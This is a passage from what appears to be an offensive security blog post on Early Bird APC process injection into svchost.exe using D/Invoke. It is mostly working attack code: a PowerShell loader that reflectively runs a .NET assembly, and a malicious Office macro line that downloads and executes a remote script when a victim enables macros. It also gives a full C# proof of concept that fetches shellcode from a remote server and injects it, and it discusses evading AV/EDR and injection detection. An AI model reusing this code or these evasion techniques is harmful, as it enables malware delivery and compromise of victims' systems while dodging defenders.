</span></span><span style="display:flex;"><span>$outStream.Close()
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">byte[]</span>] $outBytes = $outStream.ToArray()
</span></span><span style="display:flex;"><span>$b64Zipped = [<span style="color:#66d9ef">System.Convert</span>]::ToBase64String($outBytes)
</span></span><span style="display:flex;"><span>$b64Zipped | Out-File -NoNewLine -Encoding ASCII .\compressedEncodedBytes.txt<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span></code></pre></div><p>Create a PowerShell script to decode this compressed and encoded bytestream.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$a = New-Object System.IO.MemoryStream(, [<span style="color:#66d9ef">System.Convert</span>]::FromBase64String(<span style="color:#e6db74">&#34;compressed and encoded bytestream here&#34;</span>))
</span></span><span style="display:flex;"><span>$b = New-Object System.IO.Compression.GZipStream($a, [<span style="color:#66d9ef">System.IO.Compression.CompressionMode</span>]::Decompress)
</span></span><span style="display:flex;"><span>$c = New-Object System.IO.MemoryStream;
</span></span><span style="display:flex;"><span>$b.CopyTo($c)
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">byte[]</span>]$d = $c.ToArray()
</span></span><span style="display:flex;"><span>$e = [<span style="color:#66d9ef">System.Reflection.Assembly</span>]::Load($d)
</span></span><span style="display:flex;"><span>$f = [<span style="color:#66d9ef">System.Console</span>]::Out
</span></span><span style="display:flex;"><span>$g = New-Object System.IO.StringWriter
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">System.Console</span>]::SetOut($g)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$h = [<span style="color:#66d9ef">Reflection.BindingFlags</span>]<span style="color:#e6db74">&#34;Public,NonPublic,Static&#34;</span>
</span></span><span style="display:flex;"><span>$i = $e.GetType(<span style="color:#e6db74">&#34;injection.Program&#34;</span>, $h)
</span></span><span style="display:flex;"><span>$j = $i.GetMethod(<span style="color:#e6db74">&#34;Main&#34;</span>, $h)
</span></span><span style="display:flex;"><span>$j.Invoke($null, (, [<span style="color:#66d9ef">string[]</span>]$args))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">System.Console</span>]::SetOut($f)
</span></span><span style="display:flex;"><span>$k = $g.ToString()
</span></span><span style="display:flex;"><span>$k
</span></span></code></pre></div><p>Get this PowerShell script to be loaded and executed via an Office macro, something like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-vbnet" data-lang="vbnet"><span style="display:flex;"><span><span style="color:#66d9ef">Dim</span> str <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>
</span></span><span style="display:flex;"><span>    walk <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;powershell iex (iwr http://hostingserver/notmalicious.ps1 -Useb)&#34;</span>
</span></span><span style="display:flex;"><span>    CreateObject(<span style="color:#e6db74">&#34;Wscript.Shell&#34;</span>).Run walk, 0
</span></span></code></pre></div><p>When the victim opens the maldoc and enables macro, WINWORD will load our PowerShell script, decode, decompress and reflectively run the .NET Assembly.</p>
<p>
    <img src="/images/earlybird_injection.png"  alt="inject into svchost.exe"  class="center"  style="border-radius: 8px;"  />


<em>Process injection into svchost.exe</em></p>
<p>
    <img src="/images/not_caught_by_getInjectedThread.png"  alt="Get-InjectedThread could no longer detect our injection"  class="center"  style="border-radius: 8px;"  />


<em>Get-InjectedThread could no longer detect our injection</em></p>
<h2 id="is-this-good-enough">Is this good enough?</h2>
<p>Well no, modern AV/EDR can still nuke our work immediately, this is mainly to demonstrate a common injection technique implemented with D/Invoke.
In Part 2, we can make our <code>svchost.exe</code> malware even more benign by PPID Spoofing, making it appear as it got spawned by <code>services.exe</code>, which is normally the case. I&rsquo;m also working on invoking system calls with D/Invoke instead of standard API calls to defeat API Hooking. Stay tuned!</p>
<p>Full PoC is below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Diagnostics;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.IO;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Runtime.InteropServices;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Net.Http;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> DInvoke_Injection
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Program</span>
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Grab shellcode from a remote server</span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">byte</span>[] sheocode;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">using</span> (<span style="color:#66d9ef">var</span> recv = <span style="color:#66d9ef">new</span> HttpClient())
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>				sheocode = recv.GetByteArrayAsync(<span style="color:#e6db74">&#34;https://remote_server/shellcode.bin&#34;</span>).GetAwaiter().GetResult();
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			STRUCTS.STARTUPINFO startInfo = <span style="color:#66d9ef">new</span> STRUCTS.STARTUPINFO();
</span></span><span style="display:flex;"><span>			STRUCTS.PROCESS_INFORMATION procInfo = <span style="color:#66d9ef">new</span> STRUCTS.PROCESS_INFORMATION();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Invoke functions/APIs via Delegates</span>
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Get the pointer to the fucntions from DLLs</span>
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Then, get the delegate for the function pointer. Store it into a variable with the same delegate type</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// CreateProcess</span>
</span></span><span style="display:flex;"><span>			IntPtr pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;CreateProcessA&#34;</span>);
</span></span><span style="display:flex;"><span>			DELEGATES.CreateProcess createProc = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.CreateProcess)) <span style="color:#66d9ef">as</span> DELEGATES.CreateProcess;
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Start proc in suspended state </span>
</span></span><span style="display:flex;"><span>			createProc(<span style="color:#e6db74">&#34;C:\\Windows\\System32\\svchost.exe&#34;</span>, <span style="color:#66d9ef">null</span>, IntPtr.Zero, IntPtr.Zero, <span style="color:#66d9ef">false</span>, STRUCTS.ProcessCreationFlags.CREATE_SUSPENDED,
</span></span><span style="display:flex;"><span>			IntPtr.Zero, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">ref</span> startInfo, <span style="color:#66d9ef">out</span> procInfo);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// VirtualAllocEx</span>
</span></span><span style="display:flex;"><span>			pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;VirtualAllocEx&#34;</span>);
</span></span><span style="display:flex;"><span>			DELEGATES.VirtualAllocEx virAllEx = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.VirtualAllocEx)) <span style="color:#66d9ef">as</span> DELEGATES.VirtualAllocEx;
</span></span><span style="display:flex;"><span>			IntPtr allocret = virAllEx(procInfo.hProcess, IntPtr.Zero, (<span style="color:#66d9ef">uint</span>)sheocode.Length, <span style="color:#ae81ff">0x1000</span> | <span style="color:#ae81ff">0x2000</span>, <span style="color:#ae81ff">0x04</span>); <span style="color:#75715e">//MEM_COMMIT | MEM_RESERVE; 0x04: RW</span>
</span></span><span style="display:flex;"><span>			Console.WriteLine(<span style="color:#e6db74">&#34;Base address of remote mem space is: &#34;</span> + (<span style="color:#66d9ef">long</span>)allocret, <span style="color:#ae81ff">16</span>);
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// WriteProcessMemory</span>
</span></span><span style="display:flex;"><span>			pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;WriteProcessMemory&#34;</span>);
</span></span><span style="display:flex;"><span>			DELEGATES.WriteProcessMemory writeProcMem = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.WriteProcessMemory)) <span style="color:#66d9ef">as</span> DELEGATES.WriteProcessMemory;
</span></span><span style="display:flex;"><span>			writeProcMem(procInfo.hProcess, allocret, sheocode, (<span style="color:#66d9ef">uint</span>)sheocode.Length, <span style="color:#66d9ef">out</span> UIntPtr bytesWritten);
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// VirtualProtectEx</span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">uint</span> oldProtect = <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>			pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;VirtualProtectEx&#34;</span>);
</span></span><span style="display:flex;"><span>			DELEGATES.VirtualProtectEx virProtEx = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.VirtualProtectEx)) <span style="color:#66d9ef">as</span> DELEGATES.VirtualProtectEx;
</span></span><span style="display:flex;"><span>			virProtEx(procInfo.hProcess, allocret, sheocode.Length, <span style="color:#ae81ff">0x20</span>, <span style="color:#66d9ef">out</span> oldProtect); <span style="color:#75715e">// 0x20: RX</span>
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// QueueUserAPC</span>
</span></span><span style="display:flex;"><span>			pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;QueueUserAPC&#34;</span>);
</span></span><span style="display:flex;"><span>			DELEGATES.QueueUserAPC qUsrAPC = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.QueueUserAPC)) <span style="color:#66d9ef">as</span> DELEGATES.QueueUserAPC;
</span></span><span style="display:flex;"><span>			qUsrAPC(allocret, procInfo.hThread, IntPtr.Zero);
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// ResumeThread</span>
</span></span><span style="display:flex;"><span>			pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;ResumeThread&#34;</span>);
</span></span><span style="display:flex;"><span>			DELEGATES.ResumeThread resThrd = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.ResumeThread)) <span style="color:#66d9ef">as</span> DELEGATES.ResumeThread;
</span></span><span style="display:flex;"><span>			resThrd(procInfo.hThread);
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Creating DELEGATES for functions</span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// https://thewover.github.io/Dynamic-Invoke/</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DELEGATES</span>
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Delegate for CreateProcess</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> <span style="color:#66d9ef">bool</span> CreateProcess(<span style="color:#66d9ef">string</span> lpApplicationName, <span style="color:#66d9ef">string</span> lpCommandLine, IntPtr lpProcessAttributes,
</span></span><span style="display:flex;"><span>		IntPtr lpThreadAttributes, <span style="color:#66d9ef">bool</span> bInheritHandles, STRUCTS.ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">string</span> lpCurrentDirectory, <span style="color:#66d9ef">ref</span> STRUCTS.STARTUPINFO lpStartupInfo, <span style="color:#66d9ef">out</span> STRUCTS.PROCESS_INFORMATION lpProcessInformation);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Delegate for VirtualAllocEx</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, <span style="color:#66d9ef">uint</span> dwSize, <span style="color:#66d9ef">uint</span> flAllocationType, <span style="color:#66d9ef">uint</span> flProtect);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Delegate for WriteProcessMemory</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> <span style="color:#66d9ef">bool</span> WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, <span style="color:#66d9ef">byte</span>[] lpBuffer, <span style="color:#66d9ef">uint</span> nSize, <span style="color:#66d9ef">out</span> UIntPtr lpNumberOfBytesWritten);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Delegate for VirtualProtectEx</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> <span style="color:#66d9ef">bool</span> VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, <span style="color:#66d9ef">int</span> dwSize, <span style="color:#66d9ef">uint</span> flNewProtect, <span style="color:#66d9ef">out</span> <span style="color:#66d9ef">uint</span> lpflOldProtect);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Delegate for QueueUserAPC</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Delegate for ResumeThread</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> <span style="color:#66d9ef">uint</span> ResumeThread(IntPtr hThhread);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Delegate for LdrLoadDll</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> UInt32 LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, <span style="color:#66d9ef">ref</span> STRUCTS.UNICODE_STRING ModuleFileName, <span style="color:#66d9ef">ref</span> IntPtr ModuleHandle);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Delegate for RtlInitUnicodeString</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> <span style="color:#66d9ef">void</span> RtlInitUnicodeString(<span style="color:#66d9ef">ref</span> STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] <span style="color:#66d9ef">string</span> SourceString);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// DInvoke functions from https://github.com/TheWover/DInvoke/blob/dev/DInvoke/DInvoke/DynamicInvoke/Generic.cs</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DInvokeFunctions</span>
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Dynamically invoke an arbitrary function from a DLL, providing its name, function prototype, and arguments, where:</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// DLLName: Name of the DLL.</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// FunctionName: Name of the function.</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// FunctionDelegateType: Prototype for the function, represented as a Delegate object.</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Parameters: Parameters to pass to the function. Can be modified if function uses call by reference.</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// CanLoadFromDisk: Whether the DLL may be loaded from disk if it is not already loaded. Default is false.</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// ResolveForwards: Whether or not to resolve export forwards. Default is true.</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// return: Object returned by the function. Must be unmarshalled by the caller.</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">object</span> DynamicAPIInvoke(<span style="color:#66d9ef">string</span> DLLName, <span style="color:#66d9ef">string</span> FunctionName, Type FunctionDelegateType, <span style="color:#66d9ef">ref</span> <span style="color:#66d9ef">object</span>[] Parameters, <span style="color:#66d9ef">bool</span> CanLoadFromDisk = <span style="color:#66d9ef">false</span>, <span style="color:#66d9ef">bool</span> ResolveForwards = <span style="color:#66d9ef">true</span>)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName, CanLoadFromDisk, ResolveForwards);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> DynamicFunctionInvoke(pFunction, FunctionDelegateType, <span style="color:#66d9ef">ref</span> Parameters);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Dynamically invokes an arbitrary function from a pointer. Useful for manually mapped modules or loading/invoking unmanaged code from memory, where:</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;FunctionPointer&#34;&gt;A pointer to the unmanaged function.&lt;/param&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;FunctionDelegateType&#34;&gt;Prototype for the function, represented as a Delegate object.&lt;/param&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;Parameters&#34;&gt;Arbitrary set of parameters to pass to the function. Can be modified if function uses call by reference.&lt;/param&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;returns&gt;Object returned by the function. Must be unmarshalled by the caller.&lt;/returns&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">object</span> DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, <span style="color:#66d9ef">ref</span> <span style="color:#66d9ef">object</span>[] Parameters)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> funcDelegate.DynamicInvoke(Parameters);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Helper for getting the pointer to a function from a DLL loaded by the process, where:</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;DLLName&#34;&gt;The name of the DLL (e.g. &#34;ntdll.dll&#34; or &#34;C:\Windows\System32\ntdll.dll&#34;).&lt;/param&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;FunctionHash&#34;&gt;Hash of the exported procedure.&lt;/param&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;Key&#34;&gt;64-bit integer to initialize the keyed hash object (e.g. 0xabc or 0x1122334455667788).&lt;/param&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;CanLoadFromDisk&#34;&gt;Optional, indicates if the function can try to load the DLL from disk if it is not found in the loaded module list.&lt;/param&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;ResolveForwards&#34;&gt;Whether or not to resolve export forwards. Default is true.&lt;/param&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;returns&gt;IntPtr for the desired function.&lt;/returns&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> IntPtr GetLibraryAddress(<span style="color:#66d9ef">string</span> DLLName, <span style="color:#66d9ef">string</span> FunctionHash, <span style="color:#66d9ef">bool</span> CanLoadFromDisk = <span style="color:#66d9ef">false</span>, <span style="color:#66d9ef">bool</span> ResolveForwards = <span style="color:#66d9ef">true</span>)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			IntPtr hModule = GetLoadedModuleAddress(DLLName);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (hModule == IntPtr.Zero &amp;&amp; CanLoadFromDisk)
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				hModule = LoadModuleFromDisk(DLLName);
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (hModule == IntPtr.Zero)
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> FileNotFoundException(DLLName + <span style="color:#e6db74">&#34;, unable to find the specified file.&#34;</span>);
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (hModule == IntPtr.Zero)
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> DllNotFoundException(DLLName + <span style="color:#e6db74">&#34;, Dll was not found.&#34;</span>);
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> GetExportAddress(hModule, FunctionHash);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Helper for getting the base address of a module loaded by the current process. This base</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/// address could be passed to GetProcAddress/LdrGetProcedureAddress or it could be used for</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/// manual export parsing. This function uses the .NET System.Diagnostics.Process class. Where:</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;DLLName&#34;&gt;The name of the DLL (e.g. &#34;ntdll.dll&#34;).&lt;/param&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;returns&gt;IntPtr base address of the loaded module or IntPtr.Zero if the module is not found.&lt;/returns&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> IntPtr GetLoadedModuleAddress(<span style="color:#66d9ef">string</span> DLLName)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">foreach</span> (ProcessModule Mod <span style="color:#66d9ef">in</span> ProcModules)
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">return</span> Mod.BaseAddress;
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> IntPtr.Zero;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Resolves LdrLoadDll and uses that function to load a DLL from disk, where:</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;DLLPath&#34;&gt;The path to the DLL on disk. Uses the LoadLibrary convention.&lt;/param&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;returns&gt;IntPtr base address of the loaded module or IntPtr.Zero if the module was not loaded successfully.&lt;/returns&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> IntPtr LoadModuleFromDisk(<span style="color:#66d9ef">string</span> DLLPath)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			STRUCTS.UNICODE_STRING uModuleName = <span style="color:#66d9ef">new</span> STRUCTS.UNICODE_STRING();
</span></span><span style="display:flex;"><span>			RtlInitUnicodeString(<span style="color:#66d9ef">ref</span> uModuleName, DLLPath);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			IntPtr hModule = IntPtr.Zero;
</span></span><span style="display:flex;"><span>			STRUCTS.NTSTATUS CallResult = LdrLoadDll(IntPtr.Zero, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">ref</span> uModuleName, <span style="color:#66d9ef">ref</span> hModule);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (CallResult != STRUCTS.NTSTATUS.Success || hModule == IntPtr.Zero)
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> IntPtr.Zero;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> hModule;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Given a module base address, resolve the address of a function by manually walking the module export table, where:</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;ModuleBase&#34;&gt;A pointer to the base address where the module is loaded in the current process.&lt;/param&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;ExportName&#34;&gt;The name of the export to search for (e.g. &#34;NtAlertResumeThread&#34;).&lt;/param&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;ResolveForwards&#34;&gt;Whether or not to resolve export forwards. Default is true.&lt;/param&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;returns&gt;IntPtr for the desired function.&lt;/returns&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> IntPtr GetExportAddress(IntPtr ModuleBase, <span style="color:#66d9ef">string</span> ExportName, <span style="color:#66d9ef">bool</span> ResolveForwards = <span style="color:#66d9ef">true</span>)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			IntPtr FunctionPtr = IntPtr.Zero;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">try</span>
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// Traverse the PE header in memory</span>
